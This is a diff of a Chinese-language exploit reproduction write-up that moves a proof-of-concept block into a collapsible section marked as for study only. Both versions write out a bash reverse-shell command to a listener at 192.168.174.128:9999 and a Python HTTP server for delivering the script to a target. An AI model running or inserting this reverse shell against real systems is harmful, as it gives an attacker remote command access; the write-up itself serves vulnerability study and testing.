@@ -102,10 +102,13 @@ Connection: close
 
 编写 shell 脚本并启动 http 服务器：
 
-```
-echo "bash -i >& /dev/tcp/192.168.174.128/9999 0>&1" > shell.sh
-python3环境下：python -m http.server 80
-```
+<details>
+<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>
+
+<pre><code class="language-text">echo "&#98;ash -i &gt;&amp; &#47;dev/tcp/192.168.174.128/9999 0&gt;&amp;1" &gt; shell.sh
+python3环境下：python -m http.server 80</code></pre>
+
+</details>
 
 上传 shell.sh 文件的命令为：
 
